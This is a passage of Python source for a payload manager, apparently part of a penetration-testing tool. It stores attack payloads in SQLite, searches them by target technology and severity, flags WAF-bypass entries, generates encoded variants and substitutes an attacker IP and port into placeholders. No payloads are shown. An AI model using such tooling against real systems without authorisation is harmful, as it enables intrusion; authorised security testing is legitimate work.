                cat, name, content, desc, tech, tags, sev, source, ctx = p
                pid = f"PAT-{cat}-{hashlib.md5(content.encode()).hexdigest()[:8]}"
                try:
                    cursor.execute("""INSERT OR IGNORE INTO payloads
                        (payload_id, category, name, content, description, target_tech,
                         tags, waf_bypass, severity, source, context)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                        (pid, cat, name, content, desc, tech,
                         json.dumps(tags), 1 if "waf_bypass" in tags else 0,
                         sev, source, ctx))
                    loaded += 1
                except Exception as e:
                    logger.debug(f"Payload load skip: {e}")
            conn.commit()
            logger.info(f"Payload manager: {loaded} payloads loaded")

    # ──────────────────────────────────────────────────────────────────────
    # SEARCH & RETRIEVAL
    # ──────────────────────────────────────────────────────────────────────

    def search(self, query: str = "", category: str = "", tech: str = "",
               severity: str = "", limit: int = 50) -> List[Dict[str, Any]]:
        """Search payloads with filters."""
        conditions = []
        params = []

        if query:
            conditions.append("(name LIKE ? OR description LIKE ? OR content LIKE ? OR tags LIKE ?)")
            q = f"%{query}%"
            params.extend([q, q, q, q])
        if category:
            conditions.append("category = ?")
            params.append(category)
        if tech:
            conditions.append("(target_tech = ? OR target_tech = 'generic')")
            params.append(tech)
        if severity:
            conditions.append("severity = ?")
            params.append(severity)

        where = " AND ".join(conditions) if conditions else "1=1"
        sql = f"SELECT * FROM payloads WHERE {where} ORDER BY severity DESC LIMIT ?"
        params.append(limit)

        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(sql, params).fetchall()
            return [dict(r) for r in rows]

    def get_by_category(self, category: str, limit: int = 100) -> List[Dict[str, Any]]:
        """Get all payloads for a category."""
        return self.search(category=category, limit=limit)

    def get_for_tech(self, tech: str, limit: int = 100) -> List[Dict[str, Any]]:
        """Get payloads targeting a specific technology."""
        return self.search(tech=tech, limit=limit)

    def get_waf_bypasses(self, category: str = "", limit: int = 50) -> List[Dict[str, Any]]:
        """Get WAF bypass payloads."""
        conditions = ["waf_bypass = 1"]
        params = []
        if category:
            conditions.append("category = ?")
            params.append(category)
        where = " AND ".join(conditions)
        sql = f"SELECT * FROM payloads WHERE {where} LIMIT ?"
        params.append(limit)

        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(sql, params).fetchall()
            return [dict(r) for r in rows]

    def get_encoded_variants(self, payload_id: str) -> List[Dict[str, str]]:
        """Get all encoding variants of a payload."""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            row = conn.execute("SELECT content FROM payloads WHERE payload_id = ?", (payload_id,)).fetchone()
            if not row:
                return []
            content = row["content"]
            variants = PayloadEncoder.generate_variants(content)
            return [{"encoding": enc, "payload": val} for enc, val in variants]

    def get_stats(self) -> Dict[str, Any]:
        """Get payload database statistics."""
        with sqlite3.connect(self.db_path) as conn:
            total = conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
            by_cat = conn.execute("SELECT category, COUNT(*) FROM payloads GROUP BY category ORDER BY COUNT(*) DESC").fetchall()
            by_sev = conn.execute("SELECT severity, COUNT(*) FROM payloads GROUP BY severity").fetchall()
            by_tech = conn.execute("SELECT target_tech, COUNT(*) FROM payloads GROUP BY target_tech ORDER BY COUNT(*) DESC LIMIT 10").fetchall()
            return {
                "total_payloads": total,
                "by_category": {r[0]: r[1] for r in by_cat},
                "by_severity": {r[0]: r[1] for r in by_sev},
                "by_technology": {r[0]: r[1] for r in by_tech},
            }

    def customize_payload(self, payload_id: str, attacker_ip: str = "ATTACKER",
                          attacker_port: str = "PORT", target: str = "") -> Optional[str]:
        """Customize a payload by replacing placeholders with actual values."""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            row = conn.execute("SELECT content FROM payloads WHERE payload_id = ?", (payload_id,)).fetchone()
            if not row:
                return None
            content = row["content"]
            content = content.replace("ATTACKER", attacker_ip)
            content = content.replace("PORT", str(attacker_port))
            if target:
                content = content.replace("TARGET", target)
            return content


# ══════════════════════════════════════════════════════════════════════════════
# GLOBAL INSTANCE
# ══════════════════════════════════════════════════════════════════════════════

payload_manager = PayloadManager()
